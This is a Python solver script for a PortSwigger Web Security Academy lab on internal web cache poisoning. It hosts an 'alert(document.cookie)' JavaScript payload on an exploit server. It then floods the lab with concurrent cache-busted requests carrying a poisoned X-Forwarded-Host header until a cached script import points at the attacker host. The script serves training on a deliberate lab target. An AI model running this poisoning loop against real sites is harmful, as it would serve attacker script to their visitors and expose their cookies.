#!/usr/bin/env python3
"""
Internal cache poisoning
PortSwigger Web Security Academy -- Web Cache Poisoning

Companion script for the writeup: 13-internal-cache-poisoning.md

What this does:
    Targets an internal, keyless application-level fragment cache that
    exposes none of the usual X-Cache/Age headers. X-Forwarded-Host reflects
    into all three of the home page's fragments (canonical link, analytics
    import, geolocate import), but only the geolocate.js fragment is
    actually served from its own independently-refreshed cached copy -- the
    other two are computed fresh every request. This script fires batches of
    concurrent, uniquely cache-busted requests (to force a miss on any
    *external* cache sitting in front of the app) carrying the poisoned
    header, hoping to land inside the narrow window the internal fragment
    happens to refresh in. Which fragment poisons first is inconsistent and
    target-dependent -- PortSwigger's own solution says so directly, and our
    runs consistently poisoned geolocate.js rather than analytics.js.

Usage:
    python 13-internal-cache-poisoning.py <lab-url> [exploit-server-url]
    e.g. python 13-internal-cache-poisoning.py https://0a1b...web-security-academy.net https://exploit-0a1c....exploit-server.net

    If exploit-server-url is omitted, the script tries to auto-discover it
    from the lab's home page.

Requirements:
    pip install httpx
"""

import asyncio
import re
import sys
import httpx


async def _lab_solved(client: httpx.AsyncClient, url: str) -> bool:
    r = await client.get(url)
    return "congratulations" in r.text.lower() or "is-solved" in r.text.lower()


async def solve(lab_url: str, exploit_server: str = "") -> None:
    host = lab_url.rstrip("/")

    if not exploit_server:
        async with httpx.AsyncClient(verify=False, timeout=15) as c:
            r = await c.get(host + "/")
            m = re.search(r"https://exploit-[^\"'\s>]+exploit-server\.net", r.text)
            if m:
                exploit_server = m.group(0).rstrip("/")
        if not exploit_server:
            print("[-] Could not find exploit server URL -- pass it explicitly")
            return

    exploit_host = exploit_server.replace("https://", "").replace("http://", "")
    print(f"[+] Exploit server: {exploit_server}")

    # Step 1: host the payload at the path the poisoned fragment imports.
    async with httpx.AsyncClient(verify=False, timeout=15, follow_redirects=True) as c:
        store_data = {
            "urlIsHttps": "on",
            "responseFile": "/js/geolocate.js",
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: application/javascript",
            "responseBody": "alert(document.cookie)",
        }
        await c.post(exploit_server + "/store", data=store_data)
        r_v = await c.get(exploit_server + "/js/geolocate.js")
        if "alert" not in r_v.text:
            print("[-] Exploit server store failed -- cannot proceed")
            return
        print("[+] Payload stored at /js/geolocate.js")

    # Step 2: rapid-fire concurrent cache-busted requests, each carrying the
    # poisoned header, to maximize the chance one lands during the internal
    # fragment's narrow, independent refresh window.
    async with httpx.AsyncClient(verify=False, timeout=15, follow_redirects=False) as c:
        print("[*] Rapid-fire internal cache poisoning loop...")

        for cycle in range(80):
            tasks = []
            for i in range(20):
                cb = f"p{cycle}_{i}"
                tasks.append(c.get(f"{host}/?x={cb}", headers={"X-Forwarded-Host": exploit_host}))
            await asyncio.gather(*tasks, return_exceptions=True)

            r_clean = await c.get(host + "/")
            is_poisoned = exploit_host in r_clean.text

            if cycle % 5 == 0:
                print(f"    Cycle {cycle + 1}: poisoned={is_poisoned}")

            if await _lab_solved(c, lab_url):
                print(f"[+] Lab solved at cycle {cycle + 1}!")
                return

            await asyncio.sleep(2)

    print("[-] Not solved after re-poison loop")


if __name__ == "__main__":
    if len(sys.argv) not in (2, 3):
        print(f"Usage: python {sys.argv[0]} <lab-url> [exploit-server-url]")
        sys.exit(1)
    exploit_server_arg = sys.argv[2].rstrip("/") if len(sys.argv) == 3 else ""
    asyncio.run(solve(sys.argv[1].rstrip("/"), exploit_server_arg))
